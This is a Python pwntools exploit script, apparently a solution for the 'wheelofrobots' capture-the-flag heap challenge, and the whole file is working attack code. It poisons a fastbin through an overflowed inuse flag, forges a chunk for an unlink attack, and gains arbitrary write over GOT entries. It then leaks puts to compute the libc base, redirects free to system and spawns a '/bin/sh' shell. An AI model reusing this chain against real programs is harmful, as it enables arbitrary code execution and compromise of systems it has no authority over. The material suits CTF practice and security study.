from pwn import *
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
if args['DEBUG']:
    context.log_level = 'debug'
context.binary = "./wheelofrobots"
robots = ELF('./wheelofrobots')
if args['REMOTE']:
    p = remote('127.0.0.1', 7777)
else:
    p = process("./wheelofrobots")
log.info('PID: ' + str(proc.pidof(p)[0]))
libc = ELF('./libc.so.6')


def offset_bin_main_arena(idx):
    word_bytes = context.word_size / 8
    offset = 4  # lock
    offset += 4  # flags
    offset += word_bytes * 10  # offset fastbin
    offset += word_bytes * 2  # top,last_remainder
    offset += idx * 2 * word_bytes  # idx
    offset -= word_bytes * 2  # bin overlap
    return offset


def add(idx, size=0):
    p.recvuntil('Your choice :')
    p.sendline('1')
    p.recvuntil('Your choice :')
    p.sendline(str(idx))
    if idx == 2:
        p.recvuntil("Increase Bender's intelligence: ")
        p.sendline(str(size))
    elif idx == 3:
        p.recvuntil("Increase Robot Devil's cruelty: ")
        p.sendline(str(size))
    elif idx == 6:
        p.recvuntil("Increase Destructor's powerful: ")
        p.sendline(str(size))


def remove(idx):
    p.recvuntil('Your choice :')
    p.sendline('2')
    p.recvuntil('Your choice :')
    p.sendline(str(idx))


def change(idx, name):
    p.recvuntil('Your choice :')
    p.sendline('3')
    p.recvuntil('Your choice :')
    p.sendline(str(idx))
    p.recvuntil("Robot's name: \n")
    p.send(name)


def start_robot():
    p.recvuntil('Your choice :')
    p.sendline('4')


def overflow_benderinuse(inuse):
    p.recvuntil('Your choice :')
    p.sendline('1')
    p.recvuntil('Your choice :')
    p.send('9999' + inuse)


def write(where, what):
    change(1, p64(where))
    change(6, p64(what))


def exp():
    print "step 1"
    # add a fastbin chunk 0x20 and free it
    # so it is in fastbin, idx2->NULL
    add(2, 1)  # idx2
    remove(2)
    # overflow bender inuse with 1
    overflow_benderinuse('\x01')
    # change bender's fd to 0x603138, point to bender's size
    # now fastbin 0x20, idx2->0x603138->NULL
    change(2, p64(0x603138))
    # in order add bender again
    overflow_benderinuse('\x00')
    # add bender again, fastbin 0x603138->NULL
    add(2, 1)
    # in order to malloc chunk at 0x603138
    # we need to bypass the fastbin size check, i.e. set *0x603140=0x20
    # it is at Robot Devil
    add(3, 0x20)
    # trigger malloc, set tinny point to 0x603148
    add(1)
    # wheels must <= 3
    remove(2)
    remove(3)

    print 'step 2'
    # alloc Destructor size 60->0x50, chunk content 0x40
    add(6, 3)
    # alloc devil, size=20*7=140, bigger than fastbin
    add(3, 7)
    # edit destructor's size to 1000 by tinny
    change(1, p64(1000))
    # place fake chunk at destructor's pointer
    fakechunk_addr = 0x6030E8
    fakechunk = p64(0) + p64(0x20) + p64(fakechunk_addr - 0x18) + p64(
        fakechunk_addr - 0x10) + p64(0x20)
    fakechunk = fakechunk.ljust(0x40, 'a')
    fakechunk += p64(0x40) + p64(0xa0)
    change(6, fakechunk)
    # trigger unlink
    remove(3)

    print 'step 3'
    # make 0x6030F8 point to 0x6030E8
    payload = p64(0) * 2 + 0x18 * 'a' + p64(0x6030E8)
    change(6, payload)

    print 'step 4'
    # make exit just as return
    write(robots.got['exit'], 0x401954)

    print 'step 5'
    # set wheel cnt =3, 0x603130 in order to start robot
    write(0x603130, 3)
    # set destructor point to puts@got
    change(1, p64(robots.got['puts']))
    start_robot()
    p.recvuntil('New hands great!! Thx ')
    puts_addr = p.recvuntil('!\n', drop=True).ljust(8, '\x00')
    puts_addr = u64(puts_addr)
    log.success('puts addr: ' + hex(puts_addr))
    libc_base = puts_addr - libc.symbols['puts']
    log.success('libc base: ' + hex(libc_base))
    system_addr = libc_base + libc.symbols['system']
    binsh_addr = libc_base + next(libc.search('/bin/sh'))

    # make free->system
    write(robots.got['free'], system_addr)
    # make destructor point to /bin/sh addr
    write(0x6030E8, binsh_addr)
    # get shell
    remove(6)
    p.interactive()

    pass


if __name__ == "__main__":
    exp()
